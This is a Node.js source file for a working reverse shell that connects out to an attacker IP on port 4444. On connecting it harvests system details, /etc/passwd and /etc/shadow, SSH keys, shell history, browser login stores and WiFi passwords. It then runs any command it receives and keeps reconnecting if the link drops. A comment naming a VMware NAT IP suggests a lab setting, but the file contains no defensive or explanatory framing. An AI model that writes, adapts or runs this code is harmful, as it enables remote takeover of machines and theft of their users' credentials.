const net = require('net');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');

const ATTACKER_IP = '192.168.217.1';  // Your Windows VMware NAT IP
const ATTACKER_PORT = 4444;

function executeCommand(command, callback) {
    exec(command, { timeout: 10000 }, (error, stdout, stderr) => {
        if (error) {
            callback(`Error: ${error.message}`);
        } else {
            callback(stdout || stderr || 'Command executed successfully');
        }
    });
}

function gatherCredentials(socket) {
    socket.write('\n=== CREDENTIAL HARVESTING STARTED ===\n\n');
    socket.write('[+] Gathering System Information...\n\n');
    
    const commands = [
        { name: 'whoami', cmd: 'whoami' },
        { name: 'hostname', cmd: 'hostname' },
        { name: 'uname -a', cmd: 'uname -a' },
        { name: 'id', cmd: 'id' },
        { name: 'groups', cmd: 'groups' },
        { name: 'sudo -l', cmd: 'sudo -l 2>/dev/null || echo "Cannot check sudo privileges"' },
        { name: 'ps aux', cmd: 'ps aux | head -20' },
        { name: 'netstat -tulpn', cmd: 'netstat -tulpn 2>/dev/null | head -20 || ss -tulpn | head -20' },
        { name: 'ifconfig', cmd: 'ifconfig 2>/dev/null || ip addr show' },
        { name: 'route', cmd: 'route -n 2>/dev/null || ip route show' },
        { name: 'arp -a', cmd: 'arp -a 2>/dev/null || ip neigh show' },
        { name: 'crontab -l', cmd: 'crontab -l 2>/dev/null || echo "No crontab for current user"' },
        { name: 'history', cmd: 'history | tail -20 2>/dev/null || echo "History not available"' },
        { name: 'env', cmd: 'env | grep -E "(PATH|HOME|USER|SHELL|PWD)"' },
        { name: 'cat /etc/passwd', cmd: 'cat /etc/passwd 2>/dev/null | head -20 || echo "Cannot read /etc/passwd"' },
        { name: 'cat /etc/shadow', cmd: 'cat /etc/shadow 2>/dev/null | head -10 || echo "Cannot read /etc/shadow (requires root)"' },
        { name: 'find SUID files', cmd: 'find / -perm -4000 -type f 2>/dev/null | head -20' },
        { name: 'find writable dirs', cmd: 'find / -writable -type d 2>/dev/null | head -20' },
        { name: 'SSH keys', cmd: 'find /home -name "*.pub" -o -name "id_*" 2>/dev/null | head -10' },
        { name: 'bash history', cmd: 'find /home -name ".bash_history" -exec head -10 {} \; 2>/dev/null' },
        { name: 'Firefox profiles', cmd: 'find /home -path "*/.mozilla/firefox/*/logins.json" 2>/dev/null' },
        { name: 'Chrome profiles', cmd: 'find /home -path "*/.config/google-chrome/*/Login Data" 2>/dev/null' },
        { name: 'WiFi passwords', cmd: 'find /etc/NetworkManager/system-connections/ -name "*.nmconnection" -exec grep -H "psk=" {} \; 2>/dev/null || echo "No WiFi passwords found"' }
    ];
    
    let commandIndex = 0;
    
    function runNextCommand() {
        if (commandIndex >= commands.length) {
            socket.write('\n=== CREDENTIAL HARVESTING COMPLETED ===\n\n');
            socket.write('Shell ready. Type commands:\n');
            return;
        }
        
        const currentCommand = commands[commandIndex];
        socket.write(`--- ${currentCommand.name} ---\n`);
        
        executeCommand(currentCommand.cmd, (result) => {
            socket.write(result + '\n\n');
            commandIndex++;
            setTimeout(runNextCommand, 500);
        });
    }
    
    runNextCommand();
}

function connectToAttacker() {
    const socket = new net.Socket();
    
    socket.connect(ATTACKER_PORT, ATTACKER_IP, () => {
        console.log('Connected to attacker');
        
        // Send initial connection info
        socket.write(`[+] Connection established from ${os.hostname()} (${os.userInfo().username})\n`);
        socket.write(`[+] OS: ${os.type()} ${os.release()}\n`);
        socket.write(`[+] Architecture: ${os.arch()}\n`);
        socket.write(`[+] Platform: ${os.platform()}\n\n`);
        
        // Start credential harvesting
        gatherCredentials(socket);
        
        // Handle incoming commands
        socket.on('data', (data) => {
            const command = data.toString().trim();
            
            if (command === 'exit') {
                socket.destroy();
                return;
            }
            
            executeCommand(command, (result) => {
                socket.write(result + '\n');
            });
        });
    });
    
    socket.on('error', (err) => {
        console.log('Connection error:', err.message);
        setTimeout(connectToAttacker, 5000);
    });
    
    socket.on('close', () => {
        console.log('Connection closed');
        setTimeout(connectToAttacker, 5000);
    });
}

// Start the reverse shell
connectToAttacker();